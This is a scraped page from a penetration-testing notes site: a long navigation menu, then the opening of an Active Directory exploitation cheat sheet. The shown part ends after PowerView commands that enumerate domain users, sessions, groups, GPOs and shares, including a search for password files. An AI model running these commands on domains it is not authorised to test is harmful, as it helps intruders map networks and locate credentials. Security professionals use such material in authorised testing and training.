Password Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Password Attacks" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_7"> <span class="md-nav__icon md-icon"></span> Password Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_1" id="__nav_4_3_7_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_1"> <span class="md-ellipsis"> Remote Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Remote Attacks" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_1"> <span class="md-nav__icon md-icon"></span> Remote Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/remote_password_attacks/network_services/"> <span class="md-ellipsis"> Network Services </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/remote_password_attacks/password_mutations/"> <span class="md-ellipsis"> Password Mutations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_2" id="__nav_4_3_7_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_2"> <span class="md-ellipsis"> Windows Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Windows Local Attacks" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_2"> <span class="md-nav__icon md-icon"></span> Windows Local Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/windows_local_password_attacks/attacking_sam/"> <span class="md-ellipsis"> Attacking Sam </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/windows_local_password_attacks/attacking_lsass/"> <span class="md-ellipsis"> Attacking LSASS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/windows_local_password_attacks/attacking_ad_ntdsdit/"> <span class="md-ellipsis"> Attacking AD &amp; NTDS.dit </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/windows_local_password_attacks/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_3" id="__nav_4_3_7_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_3"> <span class="md-ellipsis"> Linux Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Linux Local Attacks" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_3"> <span class="md-nav__icon md-icon"></span> Linux Local Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/linux_local_password_attacks/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/linux_local_password_attacks/passwd_shadow_opasswd/"> <span class="md-ellipsis"> Passwd, Shadow, Opasswd </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_4" id="__nav_4_3_7_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_4"> <span class="md-ellipsis"> Cracking Files </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Cracking Files" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_4"> <span class="md-nav__icon md-icon"></span> Cracking Files </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/cracking_files/protected_files/"> <span class="md-ellipsis"> Protected Files </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../password_attacks/cracking_files/protected_archives/"> <span class="md-ellipsis"> Protected Archives </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_8" id="__nav_4_3_8" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_8"> <span class="md-ellipsis"> Pivoting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Pivoting" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_8"> <span class="md-nav__icon md-icon"></span> Pivoting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/dynamic_port_forwarding_ssh/"> <span class="md-ellipsis"> Dynamic Port Forwarding w/ SSH and SOCKS Tunneling </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/remote_reverse_port_forwarding_ssh/"> <span class="md-ellipsis"> Remote/Reverse Port Forwarding w/ SSH </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/meterpreter_tunneling_and_port_forwarding/"> <span class="md-ellipsis"> Meterpreter Tunneling &amp; Port Forwarding </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_8_4" id="__nav_4_3_8_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_8_4"> <span class="md-ellipsis"> Socat </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Socat" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_8_4"> <span class="md-nav__icon md-icon"></span> Socat </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/socat/socat_reverse_shell/"> <span class="md-ellipsis"> Reverse Shell </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/socat/socat_bind_shell/"> <span class="md-ellipsis"> Bind Shell </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/obstacles/ssh_for_win_plink/"> <span class="md-ellipsis"> SSH for Windows: plink </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/obstacles/ssh_pivoting_sshuttle/"> <span class="md-ellipsis"> SSH Pivoting w/ Sshuttle </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/obstacles/webserver_pivoting_rpivot/"> <span class="md-ellipsis"> WebServer Pivoting w/ Rpivot </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/obstacles/port_forwarding_windows_netsh/"> <span class="md-ellipsis"> Port Forwarding Windows: Netsh </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/dns_tunneling_dnscat2/"> <span class="md-ellipsis"> DNS Tunneling w/ Dnscat2 </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/socks5_tunneling_chisel/"> <span class="md-ellipsis"> SOCKS5 Tunneling with Chisel </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/icmp_tunneling_socks/"> <span class="md-ellipsis"> ICMP Tunneling with SOCKS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../ptpf/rdp_socks_tunneling_socksoverrdp/"> <span class="md-ellipsis"> RDP and SOCKS Tunneling w/ SocksOverRDP </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9" id="__nav_4_3_9" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9"> <span class="md-ellipsis"> Web </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Web" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_9"> <span class="md-nav__icon md-icon"></span> Web </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_1" id="__nav_4_3_9_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_1"> <span class="md-ellipsis"> Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Information Gathering" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_9_1"> <span class="md-nav__icon md-icon"></span> Information Gathering </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_1_1" id="__nav_4_3_9_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_1_1"> <span class="md-ellipsis"> Passive Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Passive Information Gathering" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_9_1_1"> <span class="md-nav__icon md-icon"></span> Passive Information Gathering </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/passive_info_gathering/whois/"> <span class="md-ellipsis"> WHOIS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/passive_info_gathering/dns/"> <span class="md-ellipsis"> DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/passive_info_gathering/passive_subdomain_enum/"> <span class="md-ellipsis"> Subdomain Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/passive_info_gathering/passive_infrastructure_identification/"> <span class="md-ellipsis"> Infrastructure Identification </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_1_2" id="__nav_4_3_9_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_1_2"> <span class="md-ellipsis"> Active Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Active Information Gathering" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_9_1_2"> <span class="md-nav__icon md-icon"></span> Active Information Gathering </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/active_info_gathering/active_infrastructure_identification/"> <span class="md-ellipsis"> Infrastructure Identification </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/active_info_gathering/active_subdomain_enumeration/"> <span class="md-ellipsis"> Subdomain Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/active_info_gathering/virtual_hosts/"> <span class="md-ellipsis"> Virtual Hosts </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/info_gathering/active_info_gathering/crawling/"> <span class="md-ellipsis"> Crawling </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/ffuf/"> <span class="md-ellipsis"> Ffuf </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/hydra/"> <span class="md-ellipsis"> Hydra </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_4" id="__nav_4_3_9_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_4"> <span class="md-ellipsis"> SQLMap </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="SQLMap" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_9_4"> <span class="md-nav__icon md-icon"></span> SQLMap </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/build_attacks/"> <span class="md-ellipsis"> Building Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/db_enumeration/"> <span class="md-ellipsis"> DB Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/advanced_db_enumeration/"> <span class="md-ellipsis"> Advanced DB Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/bypassing_web_protections/"> <span class="md-ellipsis"> Bypassing Web App Protections </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../tools/sqlmap/os_exploitation/"> <span class="md-ellipsis"> OS Exploitation </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/xss/cross_site_scripting/"> <span class="md-ellipsis"> XSS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../web/lfi/local_file_inclusion/"> <span class="md-ellipsis"> Local File Inclusion </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_10" id="__nav_4_3_10" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_10"> <span class="md-ellipsis"> Documenting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Documenting" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_10"> <span class="md-nav__icon md-icon"></span> Documenting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../documentation_and_reporting/preparation/"> <span class="md-ellipsis"> Preparation </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" id="__nav_4_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_4"> <span class="md-ellipsis"> Blue Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Blue Team" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_4"> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../file_analysis/useful_links/"> <span class="md-ellipsis"> File Analysis </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-content" data-md-component="content"> <article class="md-content__inner md-typeset"> <h1>Active Directory Exploitation Cheat Sheet</h1> <h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link"></a></h2> <ul> <li><a href="#summary">Summary</a></li> <li><a href="#tools">Tools</a></li> <li><a href="#domain-enumeration">Domain Enumeration</a></li> <li><a href="#using-powerview">Using PowerView</a></li> <li><a href="#using-ad-module">Using AD Module</a></li> <li><a href="#using-bloodhound">Using BloodHound</a><ul> <li><a href="#remote-bloodhound">Remote BloodHound</a></li> <li><a href="#on-site-bloodhound">On Site BloodHound</a></li> </ul> </li> <li><a href="#useful-enumeration-tools">Useful Enumeration Tools</a></li> <li><a href="#local-privilege-escalation">Local Privilege Escalation</a></li> <li><a href="#useful-local-priv-esc-tools">Useful Local Priv Esc Tools</a></li> <li><a href="#lateral-movement">Lateral Movement</a></li> <li><a href="#powershell-remoting">PowerShell Remoting</a></li> <li><a href="#remote-code-execution-with-ps-credentials">Remote Code Execution with PS Credentials</a></li> <li><a href="#import-a-powershell-module-and-execute-its-functions-remotely">Import a PowerShell Module and Execute its Functions Remotely</a></li> <li><a href="#executing-remote-stateful-commands">Executing Remote Stateful commands</a></li> <li><a href="#mimikatz">Mimikatz</a></li> <li><a href="#remote-desktop-protocol">Remote Desktop Protocol</a></li> <li><a href="#url-file-attacks">URL File Attacks</a></li> <li><a href="#useful-tools">Useful Tools</a></li> <li><a href="#domain-privilege-escalation">Domain Privilege Escalation</a></li> <li><a href="#kerberoast">Kerberoast</a></li> <li><a href="#asreproast">ASREPRoast</a></li> <li><a href="#password-spray-attack">Password Spray Attack</a></li> <li><a href="#force-set-spn">Force Set SPN</a></li> <li><a href="#abusing-shadow-copies">Abusing Shadow Copies</a></li> <li><a href="#list-and-decrypt-stored-credentials-using-mimikatz">List and Decrypt Stored Credentials using Mimikatz</a></li> <li><a href="#unconstrained-delegation">Unconstrained Delegation</a></li> <li><a href="#constrained-delegation">Constrained Delegation</a></li> <li><a href="#resource-based-constrained-delegation">Resource Based Constrained Delegation</a></li> <li><a href="#dnsadmins-abuse">DNSAdmins Abuse</a></li> <li><a href="#abusing-active-directory-integraded-dns">Abusing Active Directory-Integraded DNS</a></li> <li><a href="#abusing-backup-operators-group">Abusing Backup Operators Group</a></li> <li><a href="#abusing-exchange">Abusing Exchange</a></li> <li><a href="#weaponizing-printer-bug">Weaponizing Printer Bug</a></li> <li><a href="#abusing-acls">Abusing ACLs</a></li> <li><a href="#abusing-ipv6-with-mitm6">Abusing IPv6 with mitm6</a></li> <li><a href="#sid-history-abuse">SID History Abuse</a></li> <li><a href="#exploiting-sharepoint">Exploiting SharePoint</a></li> <li><a href="#zerologon">Zerologon</a></li> <li><a href="#printnightmare">PrintNightmare</a></li> <li><a href="#active-directory-certificate-services">Active Directory Certificate Services</a></li> <li><a href="#no-pac">No PAC</a></li> <li><a href="#domain-persistence">Domain Persistence</a></li> <li><a href="#golden-ticket-attack">Golden Ticket Attack</a></li> <li><a href="#dcsync-attack">DCsync Attack</a></li> <li><a href="#silver-ticket-attack">Silver Ticket Attack</a></li> <li><a href="#skeleton-key-attack">Skeleton Key Attack</a></li> <li><a href="#dsrm-abuse">DSRM Abuse</a></li> <li><a href="#custom-ssp">Custom SSP</a></li> <li><a href="#cross-forest-attacks">Cross Forest Attacks</a></li> <li><a href="#trust-tickets">Trust Tickets</a></li> <li><a href="#abuse-mssql-servers">Abuse MSSQL Servers</a></li> <li><a href="#breaking-forest-trusts">Breaking Forest Trusts</a></li> </ul> <h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link"></a></h2> <ul> <li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/dev">Powersploit</a></li> <li><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></li> <li><a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a></li> <li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li> <li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li> <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a> -&gt; <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">Compiled Version</a></li> <li><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></li> <li><a href="https://github.com/samratashok/ADModule">AD Module</a></li> <li><a href="https://github.com/HarmJ0y/ASREPRoast">ASREPRoast</a></li> </ul> <h2 id="domain-enumeration">Domain Enumeration<a class="headerlink" href="#domain-enumeration" title="Permanent link"></a></h2> <h3 id="using-powerview">Using PowerView<a class="headerlink" href="#using-powerview" title="Permanent link"></a></h3> <p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview v.3.0</a><br/> <a href="https://powersploit.readthedocs.io/en/latest/">Powerview Wiki</a></p> <ul> <li><strong>Get Current Domain:</strong> <code>Get-Domain</code></li> <li><strong>Enumerate Other Domains:</strong> <code>Get-Domain -Domain &lt;DomainName&gt;</code></li> <li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li> <li><strong>Get Domain Policy:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="nb">Get-DomainPolicy</span>
<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a>
<a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="c">#Will show us the policy configurations of the Domain about system access or kerberos</span>
<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="nb">Get-DomainPolicy</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">SystemAccess</span>
<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="nb">Get-DomainPolicy</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">KerberosPolicy</span>
</code></pre></div> <ul> <li><strong>Get Domain Controllers:</strong> <div class="highlight"><pre><span></span><code><a href="#__codelineno-1-1" id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="nb">Get-DomainController</span>
<a href="#__codelineno-1-2" id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="nb">Get-DomainController</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
</code></pre></div></li> <li><strong>Enumerate Domain Users:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-2-1" id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="c">#Save all Domain Users to a file</span>
<a href="#__codelineno-2-2" id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="nb">Get-DomainUser</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">-FilePath</span> <span class="p">.\</span><span class="n">DomainUsers</span><span class="p">.</span><span class="n">txt</span>
<a href="#__codelineno-2-3" id="__codelineno-2-3" name="__codelineno-2-3"></a>
<a href="#__codelineno-2-4" id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="c">#Will return specific properties of a specific user</span>
<a href="#__codelineno-2-5" id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="no">[username]</span> <span class="n">-Properties</span> <span class="n">DisplayName</span><span class="p">,</span> <span class="n">MemberOf</span> <span class="p">|</span> <span class="nb">Format-List</span>
<a href="#__codelineno-2-6" id="__codelineno-2-6" name="__codelineno-2-6"></a>
<a href="#__codelineno-2-7" id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="c">#Enumerate user logged on a machine</span>
<a href="#__codelineno-2-8" id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="nb">Get-NetLoggedon</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">ComputerName</span><span class="p">&gt;</span>
<a href="#__codelineno-2-9" id="__codelineno-2-9" name="__codelineno-2-9"></a>
<a href="#__codelineno-2-10" id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="c">#Enumerate Session Information for a machine</span>
<a href="#__codelineno-2-11" id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">ComputerName</span><span class="p">&gt;</span>
<a href="#__codelineno-2-12" id="__codelineno-2-12" name="__codelineno-2-12"></a>
<a href="#__codelineno-2-13" id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="c">#Enumerate domain machines of the current/specified domain where specific users are logged into</span>
<a href="#__codelineno-2-14" id="__codelineno-2-14" name="__codelineno-2-14"></a><span class="nb">Find-DomainUserLocation</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">UserName</span><span class="p">,</span> <span class="n">SessionFromName</span>
</code></pre></div> <ul> <li><strong>Enum Domain Computers:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-3-1" id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-Properties</span> <span class="n">OperatingSystem</span><span class="p">,</span> <span class="n">Name</span><span class="p">,</span> <span class="n">DnsHostName</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">-Property</span> <span class="n">DnsHostName</span>
<a href="#__codelineno-3-2" id="__codelineno-3-2" name="__codelineno-3-2"></a>
<a href="#__codelineno-3-3" id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="c">#Enumerate Live machines</span>
<a href="#__codelineno-3-4" id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="nb">Get-DomainComputer</span> <span class="n">-Ping</span> <span class="n">-Properties</span> <span class="n">OperatingSystem</span><span class="p">,</span> <span class="n">Name</span><span class="p">,</span> <span class="n">DnsHostName</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">-Property</span> <span class="n">DnsHostName</span>
</code></pre></div> <ul> <li><strong>Enum Groups and Group Members:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-4-1" id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="c">#Save all Domain Groups to a file:</span>
<a href="#__codelineno-4-2" id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="nb">Get-DomainGroup</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">-FilePath</span> <span class="p">.\</span><span class="n">DomainGroup</span><span class="p">.</span><span class="n">txt</span>
<a href="#__codelineno-4-3" id="__codelineno-4-3" name="__codelineno-4-3"></a>
<a href="#__codelineno-4-4" id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="c">#Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins)</span>
<a href="#__codelineno-4-5" id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="nb">Get-DomainGroup</span> <span class="n">-Identity</span> <span class="s1">'&lt;GroupName&gt;'</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">Member</span>
<a href="#__codelineno-4-6" id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s1">'&lt;GroupName&gt;'</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">MemberDistinguishedName</span>
<a href="#__codelineno-4-7" id="__codelineno-4-7" name="__codelineno-4-7"></a>
<a href="#__codelineno-4-8" id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="c">#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine</span>
<a href="#__codelineno-4-9" id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="nb">Get-NetLocalGroup</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">GroupName</span>
<a href="#__codelineno-4-10" id="__codelineno-4-10" name="__codelineno-4-10"></a>
<a href="#__codelineno-4-11" id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="c">#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine</span>
<a href="#__codelineno-4-12" id="__codelineno-4-12" name="__codelineno-4-12"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-GroupName</span> <span class="n">Administrators</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">MemberName</span><span class="p">,</span> <span class="n">IsGroup</span><span class="p">,</span> <span class="n">IsDomain</span>
<a href="#__codelineno-4-13" id="__codelineno-4-13" name="__codelineno-4-13"></a>
<a href="#__codelineno-4-14" id="__codelineno-4-14" name="__codelineno-4-14"></a><span class="c">#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences</span>
<a href="#__codelineno-4-15" id="__codelineno-4-15" name="__codelineno-4-15"></a><span class="nb">Get-DomainGPOLocalGroup</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">GPODisplayName</span><span class="p">,</span> <span class="n">GroupName</span>
</code></pre></div> <ul> <li><strong>Enumerate Shares:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="c">#Enumerate Domain Shares</span>
<a href="#__codelineno-5-2" id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="nb">Find-DomainShare</span>
<a href="#__codelineno-5-3" id="__codelineno-5-3" name="__codelineno-5-3"></a>
<a href="#__codelineno-5-4" id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="c">#Enumerate Domain Shares the current user has access</span>
<a href="#__codelineno-5-5" id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="nb">Find-DomainShare</span> <span class="n">-CheckShareAccess</span>
<a href="#__codelineno-5-6" id="__codelineno-5-6" name="__codelineno-5-6"></a>
<a href="#__codelineno-5-7" id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="c">#Enumerate "Interesting" Files on accessible shares</span>
<a href="#__codelineno-5-8" id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="nb">Find-InterestingDomainShareFile</span> <span class="n">-Include</span> <span class="p">*</span><span class="n">passwords</span><span class="p">*</span>
</code></pre></div> <ul> <li><strong>Enum Group Policies:</strong></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="nb">Get-DomainGPO</span> <span class="n">-Properties</span> <span class="n">DisplayName</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">-Property</span> <span class="n">DisplayName</span>
<a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a>
<a href="#__codelineno-6-3" id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="c">#Enumerate all GPOs to a specific computer</span>
<a href="#__codelineno-6-4" id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="nb">Get-DomainGPO</span> <span class="n">-ComputerIdentity</span> <span class="p">&lt;</span><span class="n">ComputerName</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="n">DisplayName</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">-Property</span> <span class="n">DisplayName</span>
<a href="#__codelineno-6-5" id="__codelineno-6-5" name="__codelineno-6-5"></a>
<a href="#__codelineno-6-6" id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="c">#Get users that are part of a Machine's local Admin group</span>
